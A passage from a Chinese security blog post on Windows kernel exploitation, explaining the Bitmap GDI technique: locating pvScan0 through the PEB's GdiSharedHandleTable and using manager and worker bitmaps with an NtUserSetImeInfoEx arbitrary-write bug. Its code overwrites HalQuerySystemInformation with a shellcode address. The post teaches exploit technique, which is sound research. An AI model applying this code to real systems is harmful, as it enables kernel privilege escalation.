<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当调用<code>CreateBitmap</code>之后，会在进程PEB偏移+0x94的<code>GdiSharedHandleTable</code>数组中增加一个索引。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">3</span>: kd&gt; dt _PEB</div><div class="line">ntdll!_PEB</div><div class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</div><div class="line">    <span class="params">...</span></div><div class="line">   +<span class="number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 <span class="literal">Void</span></div><div class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : Ptr32 <span class="literal">Void</span></div><div class="line">   +<span class="number">0x098</span> ProcessStarterHelper : Ptr32 <span class="literal">Void</span></div><div class="line">   <span class="params">...</span>.</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该索引是一个<code>_GDICELL</code>结构。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct _GDICELL&#123;</div><div class="line">    <span class="type">LPVOID</span> pKernelAddress;</div><div class="line">    <span class="type">USHORT</span> wProcessId;</div><div class="line">    <span class="type">USHORT</span> wCount;</div><div class="line">    <span class="type">USHORT</span> wUpper;</div><div class="line">    <span class="type">USHORT</span> wType;</div><div class="line">    <span class="type">LPVOID</span> pUserAddress;</div><div class="line">&#125; <span class="type">GDICELL</span>;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>GDICELL</code>结构的第一个成员<code>pKernelAddress</code>指向的是一个<code>SURFACE</code>对象，结构体定义如下,其中比较重要的是<code>BASEOBJECT</code>和<code>SURFOBJ</code>对象，<code>pvScan0</code>指针便位于<code>SURFOBJ</code>对象中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFACE</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    BASEOBJECT  BaseObject;</div><div class="line">    SURFOBJ     SurfObj;</div><div class="line">    <span class="comment">//XDCOBJ *   pdcoAA;</span></div><div class="line">    FLONG       flags;</div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span>  * <span class="title">const</span> <span class="title">ppal</span>;</span> <span class="comment">// Use SURFACE_vSetPalette to assign a palette</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EWNDOBJ</span>  *<span class="title">pWinObj</span>;</span></div><div class="line">    <span class="keyword">union</span></div><div class="line">    &#123;</div><div class="line">        HANDLE  hSecureUMPD;  <span class="comment">// if UMPD_SURFACE set</span></div><div class="line">        HANDLE  hMirrorParent;<span class="comment">// if MIRROR_SURFACE set</span></div><div class="line">        HANDLE  hDDSurface;   <span class="comment">// if DIRECTDRAW_SURFACE set</span></div><div class="line">    &#125;;</div><div class="line">    SIZEL       sizlDim;      <span class="comment">/* For SetBitmapDimension(), do NOT use</span></div><div class="line"><span class="comment">    HDC         hdc;          // Doc in "Undocumented Windows", page 546, seems to be supported with XP.</span></div><div class="line"><span class="comment">    ULONG       cRef;</span></div><div class="line"><span class="comment">    HPALETTE    hpalHint;</span></div><div class="line"><span class="comment">    /* For device-independent bitmaps: */</span></div><div class="line">    HANDLE      hDIBSection;</div><div class="line">    HANDLE      hSecure;</div><div class="line">    DWORD       dwOffset;</div><div class="line">    <span class="comment">//UINT       unk_078;</span></div><div class="line">    <span class="comment">/* reactos specific */</span></div><div class="line">    DWORD biClrImportant;</div><div class="line">&#125; SURFACE, *PSURFACE;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下图可以清晰的观察<code>SURFACE</code>结构的内存布局，有两个主要的结构。一个叫 <code>BASEOBJECT</code>对象，每一个 GDI 对象都有的一个头部。另一个叫<code>SURFOBJ</code>对象，保存了包括我们参数信息的实际结构。<code>BASEOBJECT</code>结构位于<code>SURFOBJ</code>之前，在寻找<code>pvScan0</code>指针过程中，我们只需要知道这个结构大小即可。在x86中，BASEOBJECT的大小是<code>0x10</code>,而在x64中，BASEOBJECT的大小是<code>0x18</code>。在图中，可以清楚的看到pvScan0指针指向PixelData区域。<br>    <img src="http://hacky.wang/blog/20230208/7c4T86WJNlPl.png?imageslim" alt="mark"></p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">typedef struct _BASEOBJECT &#123;</div><div class="line">    <span class="type">HANDLE</span>    hHmgr; 0x04</div><div class="line">    <span class="type">PVOID</span>     pEntry; 0x08</div><div class="line">    <span class="type">LONG</span>      cExclusiveLock; 0x0d</div><div class="line">    <span class="type">PW32THREAD</span> <span class="type">Tid</span>;0x10</div><div class="line">&#125;<span class="type">BASEOBJECT</span>, *<span class="type">POBJ</span>;</div><div class="line">typedef struct _SURFOBJ &#123;</div><div class="line">    <span class="type">DHSURF</span> dhsurf;        0x04</div><div class="line">    <span class="type">HSURF</span>  hsurf;         0x08</div><div class="line">    <span class="type">DHPDEV</span> dhpdev;        0x09</div><div class="line">    <span class="type">HDEV</span>   hdev;          0x0a</div><div class="line">    <span class="type">SIZEL</span>  sizlBitmap;    0x0e</div><div class="line">    <span class="type">ULONG</span>  cjBits;        0x12</div><div class="line">    <span class="type">PVOID</span>  pvBits;        0x16</div><div class="line">    <span class="type">PVOID</span>  pvScan0;       0x20</div><div class="line">    <span class="type">LONG</span>   lDelta;        0x24</div><div class="line">    <span class="type">ULONG</span>  iUniq;         0x28</div><div class="line">    <span class="type">ULONG</span>  iBitmapFormat; 0x2c</div><div class="line">    <span class="type">USHORT</span> iType;         0x2e</div><div class="line">    <span class="type">USHORT</span> fjBitmap;      0x30</div><div class="line">&#125; <span class="type">SURFOBJ</span></div></pre></td></tr></table></figure>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着如何使用BitmapGDI技术将一个任意地址覆写漏洞，改造成一个任意地址读写漏洞。首先，我们的目标是获取pvScan0指针，根据上面的接收pvScan0位于<code>SURFACE</code>对象中的<code>SURFOBJ</code>对象第0x20偏移处。而<code>SURFACE</code>对象需要根据<code>GDICELL</code>结构的第一个成员<code>pKernelAddress</code>确定的。而<code>GDICELL</code>是GdiSharedHandleTable表中的其中一个索引。所以确定pvScan0指针需要分三步。<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">PVOID</span> GetPvScan(HBITMAP hBitHandle)</div><div class="line">&#123;</div><div class="line">	<span class="attribute">DWORD</span> dwGdiCellArray = GetGdiCellArray();</div><div class="line">	<span class="attribute">PGDICELL</span> pGdiCell = (PGDICELL)(dwGdiCellArray + LOWORD(hBitHandle) * sizeof(GDICELL));</div><div class="line">	<span class="attribute">return</span> (PVOID)((DWORD)pGdiCell-&gt;pKernelAddress + 0x30);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一：根据PEB+0x94的偏移确定GDICELL数组的首地址。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">DWORD</span> GetGdiCellArray()</div><div class="line">&#123;</div><div class="line">	__asm</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="number">0x30</span>]			// <span class="built_in">eax</span> = PEB</div><div class="line">		<span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + <span class="number">0x94</span>]		// <span class="built_in">eax</span> = GDICELL数组首地址</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二根据CreateBitmap返回的HBITMAP对象，以此作为索引确定<code>GDICELL</code>结构。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PGDICELL pGdiCell = (<span class="name">PGDICELL</span>)(<span class="name">dwGdiCellArray</span> + LOWORD(<span class="name">hBitHandle</span>) * sizeof(GDICELL));</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三，获取<code>GDICELL</code>对象的第一个成员<code>pKernelAddress</code>指向的SURFACE对象，在SURFACE对象的0x30偏移就是pvScan0指针。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return (<span class="name">PVOID</span>)((<span class="name">DWORD</span>)pGdiCell-&gt;pKernelAddress + <span class="number">0</span>x30)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在我们知道了pvScan0指针，那么怎么利用漏洞修改pvScan0指针指向的内容呢？首先，创建两个Bitmap对象：Work以及Manager。并获取两个BitMap对象的pvScan0指针。分别记做workerpvScan0和managerpvScan0指针。<br>    <img src="http://hacky.wang/blog/20230208/lOt8aj5ylpt1.png?imageslim" alt="mark"></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//创建两个Bitmap对象</span></div><div class="line">hManger = CreateBitmap(<span class="number">0x60</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>, dwBuf);</div><div class="line">hWorker = CreateBitmap(<span class="number">0x60</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>, dwBuf);</div><div class="line">if (!hManger || !hWorker)</div><div class="line">&#123;</div><div class="line">	printf(<span class="string">"CreateBitmap error"</span>);</div><div class="line">	return false;</div><div class="line">&#125;</div><div class="line"><span class="comment">//获取各自的pvScan0指针。</span></div><div class="line">mpv = GetPvScan(hManger);</div><div class="line">wpv = GetPvScan(hWorker);</div></pre></td></tr></table></figure>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过任意地址覆写漏洞，改写pvScan0指针。将workerpvScan0指针覆写到managerpvScan0指针。<br>    <img src="http://hacky.wang/blog/20230208/CuJbWD2T5uSX.png?imageslim" alt="mark"><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">////将wpv覆写入mpv，此时manage bitmap对象的pvScan0指针为worker bitmap对象的pvScan0指针。</span></div><div class="line">*(PDWORD)(<span class="number">0x2C</span>) = (DWORD)mpv;</div><div class="line">*(PDWORD)(<span class="number">0x14</span>) = (DWORD)wpv;</div><div class="line">DWORD szBuf[<span class="number">0x15C</span> / <span class="keyword">sizeof</span>(DWORD)] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="comment">// 指定要写入的内容</span></div><div class="line">szBuf[<span class="number">0</span>] = (DWORD)wpv;</div><div class="line"><span class="comment">// 触发漏洞</span></div><div class="line"><span class="keyword">if</span> (!CallNtUserSetImeInfoEx(szBuf))</div><div class="line">&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"CreateBitmap error"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过Set\GetBitmaps，修改\获取pvScan0指针指向的内容。即就是将ManageBitmap对象中的pvScan0指向的内存区域修改为pHalQuerySystemInformation地址，然后再将WorkerBitmap对象的pvScan0指向的内存区域修改为Shellcode地址<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 设置hManger的可修改地址为保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">SetBitmapBits(hManger, sizeof(PVOID), <span class="meta">&amp;pHalQuerySystemInformation);  	</span></div><div class="line"><span class="comment">// 将可修改地址中的值修改为ShellCode地址</span></div><div class="line">SetBitmapBits(hWorker, sizeof(PVOID), <span class="meta">&amp;ShellCode);</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分可以这样理解，首先pvScan0指针指向的是一段内核区域，通过覆写漏洞，将workerpvScan0指向的地址覆盖到managerpvScan0指向的地址，然后先修改hManger的内核区域为HalQuerySystemInformation，接着修改hWorker的内核区域，也就是hManager的内核区域，也就是HalQuerySystemInformation地址为ShellCode地址。</p>
<h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><ul>
<li><a href="https://50u1w4y.github.io/site/HEVD/bitmap/#0x02-bitmap" target="_blank" rel="external">BitmapGDI技术</a></li>
<li><a href="https://bbs.kanxue.com/thread-272273.htm" target="_blank" rel="external">主要参照</a></li>
<li><a href="https://www.anquanke.com/post/id/247764" target="_blank" rel="external">BitmapGDI技术</a></li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/12/30/Lsass Dump/" rel="next" title="Lsass Dump">
                <i class="fa fa-chevron-left"></i> Lsass Dump
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2023/02/20/detect thread Inject——以Get-InjectedThread为例/" rel="prev" title="detect threat inject —— 以Get-InjectedThread为例">
                detect threat inject —— 以Get-InjectedThread为例 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">HaCky</p>
              <p class="site-description motion-element" itemprop="description">我是最菜的HaCky呀</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">82</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">0x1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">0x2 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-漏洞验证"><span class="nav-number">3.</span> <span class="nav-text">0x3 漏洞验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">0x4 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Bitmap-GDI"><span class="nav-number">5.</span> <span class="nav-text">0x05 Bitmap GDI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-参考文献"><span class="nav-number">6.</span> <span class="nav-text">0x07 参考文献</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">HaCky</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
  

  

  

  

</body>
</html>
